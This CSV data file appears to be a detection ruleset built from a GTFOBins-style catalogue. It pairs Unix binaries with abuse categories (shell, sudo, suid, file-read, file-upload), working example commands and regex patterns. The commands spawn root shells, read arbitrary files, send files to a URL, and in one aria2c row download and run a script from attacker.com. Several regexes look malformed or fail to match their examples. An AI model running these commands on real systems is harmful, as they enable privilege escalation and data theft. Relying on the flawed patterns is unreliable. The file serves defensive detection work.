Name,Function,ExampleCode,Regex,Notes
7z,file-read,7z a -ttar -an -so $LFILE | 7z e -ttar -si -so,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?7z\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
7z,sudo,sudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?7z\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
aa-exec,shell,aa-exec /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?aa\-exec\s+(?:/bin/(?:sh|bash))),
aa-exec,suid,./aa-exec /bin/sh -p,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?aa\-exec\s*\-p\s+(?:/bin/(?:sh|bash))),
aa-exec,sudo,sudo aa-exec /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?aa\-exec\s+(?:/bin/(?:sh|bash))),
ab,file-upload,ab -p $LFILE $URL,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ab\s*\-p\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ab,file-download,ab -v2 $URL,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ab\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ab,suid,./ab -p $LFILE $URL,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ab\s*\-p\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ab,sudo,sudo ab -p $LFILE $URL,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ab\s*\-p\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
agetty,suid,./agetty -o -p -l /bin/sh -a root tty,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?agetty\s*\-o\s*\-p\s*\-l\s*\-a\s+(?:/bin/(?:sh|bash))),
alpine,file-read,"alpine -F ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?alpine\s*\-F\s+(?:-F\b|--form\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
alpine,suid,"./alpine -F ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?alpine\s*\-F\s+(?:-F\b|--form\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
alpine,sudo,"sudo alpine -F ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?alpine\s*\-F\s+(?:-F\b|--form\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ansible-playbook,shell,"echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
ansible-playbook $TF","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ansible\-playbook\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ansible-playbook,sudo,"echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
sudo ansible-playbook $TF","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ansible\-playbook\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ansible-test,shell,ansible-test shell,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ansible\-test\s+.+),
ansible-test,sudo,sudo ansible-test shell,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ansible\-test\s+.+),
aoss,shell,aoss /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?aoss\s+(?:/bin/(?:sh|bash))),
aoss,sudo,sudo aoss /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?aoss\s+(?:/bin/(?:sh|bash))),
apache2ctl,file-read,"apache2ctl -c ""Include $LFILE"" -k stop","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?apache2ctl\s*\-c\s*\-k\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
apache2ctl,sudo,"sudo apache2ctl -c ""Include $LFILE"" -k stop","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?apache2ctl\s*\-c\s*\-k\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
apt-get,shell,"apt-get changelog apt
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?apt\-get\s+(?:/bin/(?:sh|bash))),
apt-get,sudo,"sudo apt-get changelog apt
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?apt\-get\s+(?:/bin/(?:sh|bash))),
apt-get,sudo,"echo 'Dpkg::Pre-Invoke {""/bin/sh;false""}' > $TF
sudo apt-get install -c $TF sl","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?apt\-get\s*\-c\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
apt-get,sudo,sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?apt\-get\s*\-o\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
apt,shell,"apt changelog apt
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?apt\s+(?:/bin/(?:sh|bash))),
apt,sudo,"sudo apt changelog apt
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?apt\s+(?:/bin/(?:sh|bash))),
apt,sudo,"echo 'Dpkg::Pre-Invoke {""/bin/sh;false""}' > $TF
sudo apt install -c $TF sl","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?apt\s*\-c\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
apt,sudo,sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?apt\s*\-o\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ar,file-read,"ar r ""$TF"" ""$LFILE""
cat ""$TF""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ar\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ar,suid,"./ar r ""$TF"" ""$LFILE""
cat ""$TF""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ar\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ar,sudo,"sudo ar r ""$TF"" ""$LFILE""
cat ""$TF""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ar\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
aria2c,command,"echo ""$COMMAND"" > $TF
chmod +x $TF
aria2c --on-download-error=$TF http://x","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?aria2c\s*\-\-on\-download\-error\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
aria2c,command,aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?aria2c\s*\-\-allow\-overwrite\s*\-\-gid\s*\-\-on\-download\-complete\s+.+),
